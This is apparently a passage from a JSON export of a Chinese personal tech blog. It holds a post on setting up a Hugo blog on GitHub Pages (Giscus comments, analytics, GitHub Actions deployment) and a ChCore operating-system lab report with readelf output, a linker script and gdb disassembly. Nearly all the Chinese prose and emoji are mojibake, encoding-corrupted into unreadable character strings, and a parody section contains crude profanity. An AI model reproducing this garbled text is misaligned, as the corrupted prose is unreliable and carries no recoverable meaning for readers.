slackä¸»é¢˜é‡Œä¹Ÿæ²¡æœ‰ï¼Œé‚£æ²¡äº‹äº†ã€‚\n1 2 3 4 {{\\\u0026lt;note info \u0026gt;}} ä¹¦å†™è¡¨è¾¾çš„ä¿¡æ¯ æ”¯æŒ Markdown è¯­æ³• {{\\\u0026lt; /note \u0026gt;}} ã€To be continuedã€‘\nç‰ˆæƒå— ã€To be continuedã€‘\nå¯Œæ–‡æœ¬ ã€To be continuedã€‘\nå¯¼å›¾ è¯äº‘ ä½ è¿™é™æ€ç½‘ç«™ä¸æ˜¯å¾ˆé™æ€å•Š è¯„è®ºç³»ç»Ÿ Stackä¸»é¢˜æ”¯æŒçš„è¯„è®ºç³»ç»Ÿï¼š\nhttps://stack.jimmycai.com/config/comments ğŸ‘´ä½œä¸ºç™½å«–æ€ªï¼Œæ—¢ç„¶é€‰æ‹©äº†Github Pageså½“ç„¶è¦é€‰æ‹©åŒç”Ÿæ€çš„æ–¹æ¡ˆã€‚ç›®å‰æœ‰ä¸¤ç§æ–¹æ¡ˆï¼š\nGitalkï¼šåŸºäºissueï¼Œå’Œä»“åº“ç»‘å®š Giscusï¼šåŸºäºGitHub Discussions gitalkå¯¹æ¯ä¸ªæ–‡ç« éœ€è¦ç®¡ç†å‘˜æ–°å»ºissueæ‰èƒ½è¯„è®ºå®åœ¨8å¤ªå¥½ä½¿ã€‚Giucusé…ç½®èµ·æ¥æ›´æ–¹ä¾¿ï¼š\né¦–å…ˆåˆ›å»ºä¸€ä¸ªå…¬å¼€ä»“åº“(ç›´æ¥ç”¨pageä»“åº“ä¹Ÿå¯ï¼Œæˆ–è®¸)ï¼ŒæŒ‰å®˜ç½‘è¯´çš„æ‰“å¼€DiscussionåŠŸèƒ½ï¼Œå¹¶å®‰è£…Giscus app ç„¶åæŠŠä»“åº“è·¯å¾„å¡«è¿›å®˜ç½‘ï¼Œåé¢å…¨é»˜è®¤æˆ–é€‰ç¬¬ä¸€ä¸ªï¼Œå°±å¾—åˆ°äº†ä¸€ä¸²é…ç½®ä¿¡æ¯ã€‚ æŠŠé‡Œé¢çš„é…ç½®åŠ å…¥hugoé…ç½®æ–‡ä»¶å³å¯ï¼ˆåˆ æ‰é…ç½®å˜é‡çš„data-å‰ç¼€ï¼‰ ç½‘ç«™ç»Ÿè®¡ æ•™ç¨‹ä¸€å¤§æŠŠï¼Œæå®šç§‘å­¦ä¸Šç½‘å°±æ²¡é—®é¢˜ã€‚\nç„¶åä½ å°±ä¼šå‘ç°å¹¶æ²¡æœ‰äººæ¥è®¿é—®ã€‚\nç»Ÿè®¡å¹³å°ï¼š\nhttps://analytics.google.com/ https://www.cloudflare.com/zh-cn/web-analytics/ å·¥ä½œæµç¯‡ è¿™ä¸€èŠ‚ä»‹ç»ä»æ’°å†™åˆ°éƒ¨ç½²è¸©å‘è¿‡çš„å·¥å…·/ç¯å¢ƒ\nIDEï¼švscodeå¤©ä¸‹ç¬¬ä¸€ IDEæœ€é‡è¦çš„æ˜¯é¿å…é‡å¤åŠ³åŠ¨ï¼ŒåŒ…æ‹¬å†™ä½œï¼Œå¤šåª’ä½“ç®¡ç†ï¼Œä¿å­˜ï¼Œéƒ¨ç½²ç­‰ç­‰ã€‚ ç”±äºvscodeè·Ÿgithubç°åœ¨éƒ½å§“äº†å¾®è½¯äº†ï¼Œä»–ä»¬ç®€ç›´äº²å¦‚ä¸€å®¶ã€‚\nå…·ä½“æ¥è¯´ï¼Œä½¿ç”¨vscodeå†™åšå®¢çš„å§¿åŠ¿be likeï¼š\nGUIä¸æ»‘gitåŒæ­¥ ç»ˆç«¯ä¸€é”®é¢„è§ˆï¼Œå‘å¸ƒï¼ˆç”šè‡³å¯ä»¥å†™é…ç½®åŠ ä¸€ä¸ªç»¿è‰²å°ä¸‰è§’ï¼‰ markdownæ”¯æŒï¼šå›¾ç‰‡å¤åˆ¶è‡ªåŠ¨æ’å…¥æ­£æ–‡å¹¶å¤åˆ¶åˆ°åŒè·¯å¾„ä¸‹ è¿˜å¯ä»¥è¿›ä¸€æ­¥ä¸æ»‘çš„éœ€æ±‚æ¯”å¦‚æ¨¡æ¿æ–‡ä»¶ç­‰\nvscodeæ’ä»¶ Front Matterï¼šè¿™ä¸CMSå— è¿™ä¸ªæ’ä»¶ä¹ä¸€çœ‹æŒºå‰å®³ï¼Œå®åˆ™ä¸€æ‹–å››ã€‚æä¾›äº†ä¸€ä¸ªç±»ä¼¼CMSçš„ç•Œé¢ï¼Œå¯ä»¥è‡ªåŠ¨åŒ–é…ç½®ä¸€äº›äº›Front Matterï¼Œæ¯”å¦‚æ—¥æœŸã€‚ä½†æ˜¯ç”¨äº†ä¸€ä¼šå…¶ä½œç”¨ä¸è¯´å¦‚è™æ·»ç¿¼å§ä¹Ÿå¯ä»¥ç®—å¾—ä¸ŠèŠèƒœäºæ— ã€‚\nobsdian ä½¿ç”¨obsdianæ¯”vscodeå¼ºçš„åœ°æ–¹åœ¨äºåŸç”Ÿæ”¯æŒfront matterä¸æ»‘ç®¡ç†ã€‚ å¦ä¸€ä¸ªåŸå› æ˜¯ï¼Œæ•²ä»£ç å·²ç»æ‰“å¼€ä¸€ä¸ªvscodeå›¾æ ‡äº†å®¹æ˜“æ··æ·†ã€‚ ä½†æ˜¯åœ¨markdownæ¸²æŸ“æ–¹é¢æœ‰äº›å‰²è£‚ã€‚å¸Œæœ›æœªæ¥æœ‰åˆé€‚æ’ä»¶å‡ºç°ã€‚\nGithub Pages + Github Action è‡ªåŠ¨éƒ¨ç½² https://gohugo.io/hosting-and-deployment/hosting-on-github/ éƒ¨ç½²ä¹‹åå´å‘ç°æ€»æ˜¯å¸¦æœ‰é¡¹ç›®åä½œä¸ºå­è·¯å¾„ï¼ˆå³xxx.github.io/xxxï¼‰ã€‚è¿™å°±å¾ˆè®©äººä¸çˆ½äº†ã€‚çºµè§‚å…¨ç½‘çš„åšå®¢å¤§å¤šéƒ½å¸¦ç€è¿™ä¸ªå°¾å·´ï¼Œè¡¨ç¤ºæ€€ç–‘è¿™äº›äººç©¶ç«Ÿæ˜¯ä¸æ˜¯ä¸€ç›´è¿™ä¹ˆç”¨çš„ã€‚\nhugoå®˜æ–¹ç»™å‡ºçš„workflowä¸­ï¼Œæœ€åä¸€æ­¥æ˜¯è¿™æ ·çš„\n1 2 3 4 5 6 7 8 9 10 11 # Deployment job deploy: environment: name: github-pages url: ${{ steps.deployment.outputs.page_url }} runs-on: ubuntu-latest needs: build steps: - name: Deploy to GitHub Pages id: deployment uses: actions/deploy-pages@v2 ğŸ‘´ç›´æ¥ğŸurlï¼Œä½†æ˜¯${{ steps.deployment.outputs.page_url }}æ˜¯ä¸ªç”¨æ¥è¾“å‡ºçš„ä¸œè¥¿ï¼Œæ”¹å®ƒæ²¡ç”¨ã€‚åº”è¯¥æ˜¯actions/deploy-pages@v2è¿™ä¸ªactionæœ¬èº«çš„é—®é¢˜ã€‚\näºæ˜¯ğŸ‘´å‚è€ƒäº†22å¹´çš„å‡ ç¯‡åšå®¢ï¼š\nhttps://client.sspai.com/post/73512#! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 - name: Build with Hugo env: # ... run: | hugo \\ --minify \\ --baseURL \u0026#34;https://lonelyuan.github.io/\u0026#34; # fxxk $ ... - name: Deploy Web uses: peaceiris/actions-gh-pages@v3 with: PERSONAL_TOKEN: ${{ secrets.PERSONAL_TOKEN }} EXTERNAL_REPOSITORY: pseudoyu/pseudoyu.github.io PUBLISH_BRANCH: master PUBLISH_DIR: ./public commit_message: ${{ github.event.head_commit.message }} è¿™ç§æ–¹æ³•æ¶‰åŠä¸¤ä¸ªä»“åº“ï¼Œå› æ­¤éœ€è¦é¢å¤–é…ç½®tokenã€‚æŒ‰ç…§åšå®¢çš„æ–¹æ³•æ›¿æ¢æˆpeaceiris/actions-gh-pages@v3åï¼Œå¯ä»¥æˆåŠŸåœ¨ä¸»åŸŸåæ›´æ–°äº†ã€‚\nè™½ç„¶ä½†æ˜¯ï¼Œç›®å‰çš„æ“ä½œä»å†™åšå®¢â†’hugoâ†’git pushå˜æˆäº†å†™åšå®¢â†’hugo server(æ€»å¾—é¢„è§ˆä¸€ä¸‹å§)â†’git pushï¼Œä¼¼ä¹å¹¶æ²¡æœ‰ä»€ä¹ˆç®€åŒ–ï¼Œï¼Œï¼Œè™½ç„¶å¯ä»¥ä¾é ç¼–è¾‘å™¨çš„è‡ªåŠ¨git commitçš„æ’ä»¶ï¼Œä½†æ˜¯ğŸ‘´è¿˜æ˜¯ä¸æƒ³æ¯æ¬¡ä¿å­˜éƒ½commitã€‚\nGithub Action æ”¶é›† lastmodify ä½¿ç”¨ Github çš„ CI/CD ç®¡çº¿å¯ä»¥åœ¨æ›´æ–°æ—¶ç»‘å®šåˆ°commitå·ï¼Œä½†æ˜¯ğŸ‘´è§‰å¾—æ²¡å¤ªå¤§ç”¨ã€‚æ”¹ä¸€ä¸ªå­—å°±æ›´æ–°lastmodè¿‡äºç²—ç²’åº¦ï¼Œé‚è¿˜æ˜¯é‡‡ç”¨æ‰‹åŠ¨å±•ç¤ºğŸ‘´æƒ³å±•ç¤ºçš„æ—¥æœŸã€‚\n","date":"2021-11-07T14:19:11Z","permalink":"https://lonelyuan.github.io/p/%E9%97%B2%E6%9D%A5%E6%97%A0%E4%BA%8B%E5%80%92%E8%85%BE%E5%8D%9A%E5%AE%A2/","title":"é—²æ¥æ— äº‹ï¼Œå€’è…¾åšå®¢"},{"content":"ç”±äºğŸ‘´è§‰å¾—ğŸ‘´å­¦æ ¡çš„æ“ä½œç³»ç»Ÿè®²äº†ä¸ªğŸ”¨ï¼Œæ…•åè€Œæ¥å­¦ä¹ ä¸Šäº¤çš„ MOSPI è¯¾ç¨‹ã€‚é“¶æä¹¦çœ‹å®Œä¹‹åğŸ‘´å‘ç°ğŸ‘´å­¦æ ¡çš„OSç¡®å®è®²äº†ä¸ªğŸ”¨ã€‚æˆ‘ç›´æ¥å½“åœºæ¥ä¸€æ®µåœ£ç»åŸå”±ï¼š\né‚£ä¸ªé¢è¥¿ç”µæ“ä½œç³»ç»Ÿå—·ï¼Œä¸ä¼šå†™æ•™æå¯ä»¥ä¸å†™ï¼Œå®³ç‰¹ä¹ˆåœ¨å¼„ä½ é‚£ä¸ªç®¡ç¨‹ï¼Œæ¥æˆ‘æ•™ä½ å•Šï¼Œçœ‹å¥½äº†å•Šã€‚é¦–å…ˆ M.A.L.H. åŸåˆ™ï¼Œçœ‹æ‡‚äº†å—ï¼Œç„¶åå¼€è®²è™šæ‹Ÿå†…å­˜ï¼Œå“æˆ‘å°±ä¸è™šæ‹Ÿï¼Œæˆ‘å°±è®²é‚£ä¸ªç©ºé—²é“¾è¡¨ã€‚å“ï¼Œå†æ‰ä¸ªå¤šçº¿ç¨‹ï¼Œçœ‹åˆ°æ²¡ï¼Œçº¿ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢äº†ã€‚æˆ‘ç‰¹ä¹ˆç›´æ¥ä¸‰æ®µç³»ç»Ÿè°ƒåº¦ï¼ˆçŸ­æœŸï¼Œä¸­æœŸï¼Œé•¿æœŸï¼‰ï¼Œç„¶åæˆ‘ç›´æ¥~å°±ä¸€ä¸ªå¤šæ ¸è°ƒåº¦ï¼Œæˆ‘å°±è°ƒåº¦åˆ°IPCï¼Œè¿›ç¨‹ç°åœ¨å·²ç»å¯ä»¥é€šä¿¡äº†å•Šï¼åˆ«æ€ªæˆ‘æ²¡æœ‰æ•™å¥½ä½ ï¼Œè¿›ç¨‹é€šä¿¡äº†ä¹‹åå¹²ä»€ä¹ˆï¼Œæ†‹ç‰¹ä¹ˆè®²ä½ é‚£ç ´å‡ æŠŠå¤„ç†æœºäº†ã€‚çœ‹å¥½å•Šï¼Œè®²å‡ºé”ï¼ˆå¬‰çš®ç¬‘è„¸ï¼‰ï¼Œè®²å‡ºä¿¡å·é‡ç›´æ¥å°±æ‰”åˆ°äº’æ–¥èµ„æºèº«ä¸Šï¼Œå°±ç–¯ç‹‚çš„è¿›å…¥ä»–çš„ä¸´ç•ŒåŒºã€‚ç„¶åæˆ‘å†ä¸€ä¸ªï¼Œæ–‡ä»¶ç³»ç»Ÿï¼åŠ ä¸‰æ®µç³»ç»Ÿè™šæ‹ŸåŒ–ï¼ˆCPUè™šæ‹ŸåŒ–ã€å†…å­˜è™šæ‹ŸåŒ–ã€IOè™šæ‹ŸåŒ–ï¼‰ï¼Œå…¨éƒ¨åƒæ»¡ï¼Œå®Œæˆå¼ºæ€ï¼Œä½ å”›ç’§ä½ æ‡‚ä¸ªderï¼Œè®²å¯„å§OSï¼Œæˆ‘çˆ±ä½ ã€‚\nåœ£ç»åŸæ–‡ï¼šæ‹–æ›´äº‘çš„é¹°ä½æ•™å­¦\næœ¬ç³»åˆ—ä¸º ChCore lab å®éªŒæŠ¥å‘Šã€‚ Labæºç ï¼šhttps://gitee.com/ipads-lab/chcore-lab MOSPIåœ¨çº¿ç½‘ç«™ï¼šhttps://ipads.se.sjtu.edu.cn/mospi/\nå®éªŒç¯å¢ƒ éœ€è¦dockerå’Œqemuï¼Œdockerä¸èµ˜è¿°ã€‚linuxä¸‹å®‰è£…qemuï¼š sudo apt-get install qemu-system-arm å®‰è£…å®Œæˆä¹‹åæŸ¥çœ‹ç‰ˆæœ¬å·ï¼š\n1 2 3 $ qemu-system-aarch64 --version QEMU emulator version 4.2.0 Copyright (c) 2003-2019 Fabrice Bellard and the QEMU Project developers 5ä¸ªå®éªŒåœ¨æºç ä»“åº“åˆ†åˆ«ä»¥5ä¸ªåˆ†æ”¯å­˜åœ¨ã€‚ git clone -bå³å¯ã€‚\nå†…æ ¸æ„å»ºå’Œè°ƒè¯•ï¼š\nç”¨dockeräº¤å‰ç¼–è¯‘å†…æ ¸ï¼šmake build å¯åŠ¨qemuï¼šmake qemu è¿™é‡Œé‡åˆ°æŠ¥é”™ï¼š Unable to init server: Could not connect: Connection refused gtk initialization failed è§£å†³æ–¹æ³•ï¼šä¿®æ”¹ Makefile ï¼Œåœ¨QEMUOPTSå‚æ•°ååŠ -nographic å¯åŠ¨qemuï¼šmake qemu-gdb å°†ç›‘å¬1234ç«¯å£ä»¥ä¾›gdbè¿œç¨‹è°ƒç”¨ é€€å‡ºï¼šctrl+aï¼Œç„¶åæŒ‰xã€‚ å¦‚æœæ„å¤–é€€å‡ºï¼Œè¦æ€æ­»è¿›ç¨‹ï¼škill $(ps -ef | grep qemu | grep 1234 | awk '{print $2}') åœ¨å¦ä¸€ä¸ªç»ˆç«¯å¯åŠ¨gdbè°ƒè¯•ï¼šmake gdb è¿™é‡Œå¯èƒ½éœ€è¦å®‰è£…gdb-multiarchï¼šsudo apt-get install gdb-multiarch å¯ä»¥çœ‹åˆ°ï¼Œæœ¬é¡¹ç›®ä¸­ Makefile ä¸»è¦æ˜¯å°è£…äº†ä¸€äº›å‘½ä»¤ã€‚\nLab1 ç»ƒä¹ 3-åŠ è½½å…¥å£å®šä¹‰ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 root@lastyear:~/chcore-lab# readelf -S build/kernel.img There are 9 section headers, starting at offset 0x20cd8: Section Headers: [Nr] Name Type Address Offset Size EntSize Flags Link Info Align [ 0] NULL 0000000000000000 00000000 0000000000000000 0000000000000000 0 0 0 [ 1] init PROGBITS 0000000000080000 00010000 000000000000b5b0 0000000000000008 WAX 0 0 4096 [ 2] .text PROGBITS ffffff000008c000 0001c000 00000000000011dc 0000000000000000 AX 0 0 8 [ 3] .rodata PROGBITS ffffff0000090000 00020000 00000000000000f8 0000000000000001 AMS 0 0 8 [ 4] .bss NOBITS ffffff0000090100 000200f8 0000000000008000 0000000000000000 WA 0 0 16 [ 5] .comment PROGBITS 0000000000000000 000200f8 0000000000000032 0000000000000001 MS 0 0 1 [ 6] .symtab SYMTAB 0000000000000000 00020130 0000000000000858 0000000000000018 7 46 8 [ 7] .strtab STRTAB 0000000000000000 00020988 000000000000030f 0000000000000000 0 0 1 [ 8] .shstrtab STRTAB 0000000000000000 00020c97 000000000000003c 0000000000000000 0 0 1 çœ‹åˆ°initæ®µçš„èµ·å§‹åœ°å€æ˜¯0x80000ï¼Œå’Œreadelf -hä¸­çš„ Entry point address ä¸€è‡´ï¼Œä¹Ÿå’Œ GDB åˆšè¿›å…¥æ—¶whereçš„è¾“å‡ºä¸€è‡´ã€‚\n1 2 3 0x0000000000080000 in ?? () (gdb) where #0 0x0000000000080000 in _start () ä¸‹é¢å¯»æ‰¾_startçš„å®šä¹‰ï¼Œåœ¨CMakeLists.txtä¸­æ‰¾åˆ°_startï¼Œ\n1 2 3 4 5 6 7 set_property( TARGET kernel.img APPEND_STRING PROPERTY LINK_FLAGS \u0026#34;-T ${CMAKE_CURRENT_BINARY_DIR}/${link_script} -e _start\u0026#34; ) è¿™é‡Œä¸ºkernel.imgæŒ‡å®šäº†é“¾æ¥å™¨è„šæœ¬(-T)å’Œå…¥å£å‡½æ•°(-e)ã€‚\näºæ˜¯è·Ÿéšlink_scriptï¼š\n1 2 set(link_script \u0026#34;linker.lds\u0026#34;) configure_file(\u0026#34;./scripts/linker-aarch64.lds.in\u0026#34; \u0026#34;linker.lds.S\u0026#34;) è¿›å…¥è„šæœ¬linker-aarch64.lds.inï¼š\n1 2 3 4 5 6 7 8 9 10 #include \u0026#34;../boot/image.h\u0026#34; SECTIONS { . = TEXT_OFFSET; img_start = .; init : { ${init_object} } // ... å…¶ä¸­initæ®µæŒ‡å®šäº†åŠ è½½init_objectï¼Œå®ƒè¡¨ç¤ºbootloaderçš„æ‰€æœ‰ç›®æ ‡æ–‡ä»¶é›†åˆã€‚å…¶å®šä¹‰å›åˆ°CmakeLists.txtï¼š\n1 2 3 4 5 6 7 set(init_object \u0026#34;${BINARY_KERNEL_IMG_PATH}/${BOOTLOADER_PATH}/start.S.o ${BINARY_KERNEL_IMG_PATH}/${BOOTLOADER_PATH}/mmu.c.o ${BINARY_KERNEL_IMG_PATH}/${BOOTLOADER_PATH}/tools.S.o ${BINARY_KERNEL_IMG_PATH}/${BOOTLOADER_PATH}/init_c.c.o ${BINARY_KERNEL_IMG_PATH}/${BOOTLOADER_PATH}/uart.c.o\u0026#34; ) å¯å‘ç°/boot/start.Så®šä¹‰äº†_startã€‚\nä¸‹é¢ç»§ç»­å¯»æ‰¾åœ°å€ï¼Œåœ¨é“¾æ¥å™¨è„šæœ¬å¼•ç”¨äº†image.hï¼Œå…¶ä¸­æœ‰TEXT_OFFSETçš„å®šä¹‰ï¼š\n1 2 3 4 5 6 7 #pragma once #define SZ_16K 0x4000 #define SZ_64K 0x10000 #define KERNEL_VADDR 0xffffff0000000000 #define TEXT_OFFSET 0x80000 ä¸€åˆ‡ç»ˆäºä¸²èµ·æ¥äº†ï¼š\nCMakeLists.txtï¼šæ˜¯CMakeçš„è„šæœ¬æ–‡ä»¶ã€‚ CMake æ˜¯è·¨å¹³å°çš„C/C++å»ºæ„å·¥å…·ã€‚ ä½œç”¨ï¼š æŒ‡å®šæºæ–‡ä»¶é›†åˆinit_object å®šä¹‰é“¾æ¥å™¨è„šæœ¬link_script æŒ‡å®šå…¥å£å‡½æ•°_startå¹¶æŒ‡å®šé“¾æ¥å™¨è„šæœ¬ æœ€ç»ˆç”Ÿæˆkernel.img //æœ€è¿‘çœ‹åˆ°çš„æŒºå¥½çš„CMakeæ•™ç¨‹ï¼šhttps://www.bilibili.com/video/BV1rR4y1E7n9 linker-aarch64.lds.inï¼šldsæ˜¯é“¾æ¥å™¨è„šæœ¬æ–‡ä»¶ï¼Œè´Ÿè´£æ§åˆ¶è¾“å‡ºçš„ELFæ–‡ä»¶çš„ç»†èŠ‚ã€‚ ä½œç”¨ï¼šæŒ‡å®šäº†èµ·å§‹åœ°å€0x80000 ç»ƒä¹ 3-å¤šå¤„ç†å™¨æŒ‚èµ· start.Sä¸­æ³¨é‡Šçš„å¾ˆæ˜ç™½äº†ï¼Œé€šè¿‡æ£€æŸ¥mpidr_el1å¯„å­˜å™¨æ¥åˆ¤æ–­ cpuid ï¼Œå¦‚æœä¸æ˜¯0åˆ™è¿›å…¥æ­»å¾ªç¯ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 BEGIN_FUNC(_start) mrs x8, mpidr_el1 and x8, x8, #0xFF cbz x8, primary /* hang all secondary processors before we intorduce multi-processors */ secondary_hang: bl secondary_hang primary: /* Turn to el1 from other exception levels. */ bl arm64_elX_to_el1 /* Prepare stack pointer and jump to C. */ adr x0, boot_cpu_stack add x0, x0, #0x1000 mov sp, x0 bl init_c /* Should never be here */ b . END_FUNC(_start) ç»ƒä¹ 4-LMAå’ŒVMA 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 root@lastyear:~/chcore-lab# objdump -h build/kernel.img build/kernel.img: file format elf64-little Sections: Idx Name Size VMA LMA File off Algn 0 init 0000b5b0 0000000000080000 0000000000080000 00010000 2**12 CONTENTS, ALLOC, LOAD, CODE 1 .text 000011dc ffffff000008c000 000000000008c000 0001c000 2**3 CONTENTS, ALLOC, LOAD, READONLY, CODE 2 .rodata 000000f8 ffffff0000090000 0000000000090000 00020000 2**3 CONTENTS, ALLOC, LOAD, READONLY, DATA 3 .bss 00008000 ffffff0000090100 0000000000090100 000200f8 2**4 ALLOC 4 .comment 00000032 0000000000000000 0000000000000000 000200f8 2**0 CONTENTS, READONLY å¯ä»¥å‘ç°åªæœ‰initæ®µçš„VMAå’ŒLMAç›¸åŒã€‚å…¶èµ‹å€¼è¿˜æ˜¯å›åˆ°ldsè„šæœ¬ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 SECTIONS { . = TEXT_OFFSET; img_start = .; init : { //initæ®µVMA==VMA ${init_object} } . = ALIGN(SZ_16K); // å¯¹é½16k init_end = ABSOLUTE(.); // initæ®µç»“æŸ // KERNEL_VADDRåœ¨image.hå®šä¹‰ä¸º0xffffff0000000000 .text KERNEL_VADDR + init_end : AT(init_end) { // ATæŒ‡å®šLMA *(.text*) } // .textæ®µï¼šVMA = KERNEL_VADDR + init_end; LMA = init_end // åé¢çš„æ®µï¼Œå…¨éƒ¨æŒ‰é¡ºåºå¯¹é½å¹¶é€’å¢ï¼Œæ­¤æ—¶VMAå’ŒLMAå·²ç»ä¸åŒï¼Œæ•…åé¢çš„æ®µä¹Ÿå…¨éƒ½ä¸åŒ . = ALIGN(SZ_64K); .data : { *(.data*) } . = ALIGN(SZ_64K); .rodata : { *(.rodata*) } _edata = . - KERNEL_VADDR; // è¿™äº›å¤–éƒ¨å˜é‡æŒ‡çš„æ˜¯LMAï¼Œåˆ™å‡å»è™šæ‹Ÿåœ°å€å¤´ _bss_start = . - KERNEL_VADDR; .bss : { *(.bss*) } _bss_end = . - KERNEL_VADDR; . = ALIGN(SZ_64K); img_end = . - KERNEL_VADDR; } å›ç­”é—®é¢˜ï¼š\nä¸ºä»€ä¹ˆLMAå’ŒVMAä¸åŒ\nVMAæ˜¯å¯¹åº”è™šæ‹Ÿå†…å­˜çš„åœ°å€ï¼Œä½†åœ¨å†…æ ¸å¯åŠ¨æ—¶è¿˜å¤„äºç‰©ç†åœ°å€æ¨¡å¼ï¼ŒVMAå¯èƒ½è¶…å‡ºç‰©ç†å†…å­˜èŒƒå›´ã€‚æ‰€ä»¥åªèƒ½å…ˆåŠ è½½ï¼Œå†æ˜ å°„åˆ°è™šæ‹Ÿåœ°å€ã€‚ ä¸ºä»€ä¹ˆå†…æ ¸æ®µçš„VMAè¦æ˜ å°„åˆ°é«˜ä½ï¼Œåº”è¯¥æ˜¯ä¸€ç§æƒ¯ä¾‹ã€‚ ä¸ºä»€ä¹ˆbootloaderä¸ç”¨VMAï¼Œå› ä¸ºä»–è´Ÿè´£åˆå§‹åŒ–é¡µè¡¨ï¼Œä»–ä¸èƒ½ç”¨ï¼Œä¹Ÿæ²¡æœ‰å¿…è¦ã€‚ LMAåˆ°VMAåœ¨ä½•æ—¶è½¬æ¢\nç”±ä¸Šä¸€é—®å¯çŸ¥ï¼Œé¡µè¡¨åˆå§‹åŒ–ä¹‹åä¾¿å¯è½¬æ¢ä¸ºVMAã€‚ ç»ƒä¹ 5-cè¯­è¨€è¿›åˆ¶è½¬æ¢ ä»åå¾€å‰å–ä½™å³å¯ã€‚\nç»ƒä¹ 6-å‡½æ•°æ ˆ start.Sä¸­èµ‹å€¼äº†spï¼š\n1 2 3 4 /* Prepare stack pointer and jump to C. */ adr x0, boot_cpu_stack add x0, x0, #0x1000 mov sp, x0 /* sp = boot_cpu_stack + 0x1000 */ boot_cpu_stackåœ¨init.c\n1 2 #define INIT_STACK_SIZE 0x1000 char boot_cpu_stack[PLAT_CPU_NUMBER][INIT_STACK_SIZE] ALIGN(16); ç”±äºPLAT_CPU_NUMBERè¢«å®šä¹‰ä¸º4ï¼Œæ•…boot_cpu_stackå¤§å°ä¸º4*4096ï¼Œå¯ä¾›å››ä¸ªCPUä½¿ç”¨ã€‚spåˆå§‹åŒ–åæŒ‡å‘ç¬¬ä¸€ä¸ª4069ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ªcpuå†…æ ¸æ ˆçš„æœ€é«˜ä½ã€‚åˆå§‹åŒ–æ—¶ï¼Œfp=spã€‚\nä½†è¿™æ˜¯bootloaderçš„æ ˆã€‚åç»­è¿›å…¥å†…æ ¸åï¼Œä¼šé‡æ–°åˆ†é…å†…æ ¸æ ˆï¼Œå‚è§head.Sï¼š\n1 2 3 4 5 6 7 8 BEGIN_FUNC(start_kernel) mov x3, #0 msr TPIDR_EL1, x3 ldr x2, =kernel_stack add x2, x2, KERNEL_STACK_SIZE mov sp, x2 bl main END_FUNC(start_kernel) äºæ˜¯å†…æ ¸æ ˆçš„å®šä¹‰åœ¨start_kernelå‡½æ•°ã€‚\næœ‰å…³å†…æ ¸æ ˆçš„ä½ç½®ï¼Œå› ä¸ºkernel_stackæ˜¯å…¨å±€æ•°ç»„ï¼Œä¸”æœªåˆå§‹åŒ–ï¼Œå› è€Œä½äº.bssã€‚åŒæ—¶æ²¡æœ‰å…¶ä»–æœªåˆå§‹åŒ–å˜é‡ï¼Œå› æ­¤é¦–åœ°å€åœ¨.bss + KERNEL_STACK_SIZEã€‚\né€šè¿‡readelfå¾—åˆ°.bssçš„VMAä¸º0xffffff0000090100ï¼ŒKERNEL_STACK_SIZEä¸º0x2000ï¼Œè¿›å…¥gdbè°ƒè¯•å¯ä»¥éªŒè¯\n1 2 gefâ¤ x/g $sp 0xffffff0000092100 \u0026lt;kernel_stack+8192\u0026gt;: 0x0 ç»ƒä¹ 7-è°ƒç”¨æƒ¯ä¾‹ å…ˆçœ‹stack_testå‡½æ•°ã€‚è¿™é‡Œgdbå®‰è£…äº†gefæ’ä»¶ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 gefâ¤ b stack_test Breakpoint 1 at 0xffffff000008c020 gefâ¤ disas Dump of assembler code for function stack_test: =\u0026gt; 0xffffff000008c020 \u0026lt;+0\u0026gt;: stp x29, x30, [sp, #-32]! /* FPã€LR å…¥æ ˆ */ 0xffffff000008c024 \u0026lt;+4\u0026gt;: mov x29, sp 0xffffff000008c028 \u0026lt;+8\u0026gt;: str x19, [sp, #16] /* x å…¥æ ˆ */ 0xffffff000008c02c \u0026lt;+12\u0026gt;: mov x19, x0 0xffffff000008c030 \u0026lt;+16\u0026gt;: mov x1, x0 0xffffff000008c034 \u0026lt;+20\u0026gt;: adrp x0, 0xffffff0000090000 # è®¡ç®—åç§» 0xffffff000008c038 \u0026lt;+24\u0026gt;: add x0, x0, #0x0 0xffffff000008c03c \u0026lt;+28\u0026gt;: bl 0xffffff000008c620 \u0026lt;printk\u0026gt; 0xffffff000008c040 \u0026lt;+32\u0026gt;: cmp x19, #0x0 0xffffff000008c044 \u0026lt;+36\u0026gt;: b.gt 0xffffff000008c068 \u0026lt;stack_test+72\u0026gt; # greater than /* é€’å½’ */ 0xffffff000008c048 \u0026lt;+40\u0026gt;: bl 0xffffff000008c0dc \u0026lt;stack_backtrace\u0026gt; 0xffffff000008c04c \u0026lt;+44\u0026gt;: mov x1, x19 0xffffff000008c050 \u0026lt;+48\u0026gt;: adrp x0, 0xffffff0000090000 0xffffff000008c054 \u0026lt;+52\u0026gt;: add x0, x0, #0x20 0xffffff000008c058 \u0026lt;+56\u0026gt;: bl 0xffffff000008c620 \u0026lt;printk\u0026gt; 0xffffff000008c05c \u0026lt;+60\u0026gt;: ldr x19, [sp, #16] # x19 = sp + 16 /* x å‡ºæ ˆ */ 0xffffff000008c060 \u0026lt;+64\u0026gt;: ldp x29, x30, [sp], #32 # load pair /* FPã€LR å‡ºæ ˆ */ 0xffffff000008c064 \u0026lt;+68\u0026gt;: ret 0xffffff000008c068 \u0026lt;+72\u0026gt;: sub x0, x19, #0x1 0xffffff000008c06c \u0026lt;+76\u0026gt;: bl 0xffffff000008c020 \u0026lt;stack_test\u0026gt; 0xffffff000008c070 \u0026lt;+80\u0026gt;: mov x1, x19 0xffffff000008c074 \u0026lt;+84\u0026gt;: adrp x0, 0xffffff0000090000 0xffffff000008c078 \u0026lt;+88\u0026gt;: add x0, x0, #0x20 0xffffff000008c07c \u0026lt;+92\u0026gt;: bl 0xffffff000008c620 \u0026lt;printk\u0026gt; 0xffffff000008c080 \u0026lt;+96\u0026gt;: ldr x19, [sp, #16] 0xffffff000008c084 \u0026lt;+100\u0026gt;: ldp x29, x30, [sp], #32 0xffffff000008c088 \u0026lt;+104\u0026gt;: ret End of assembler dump. 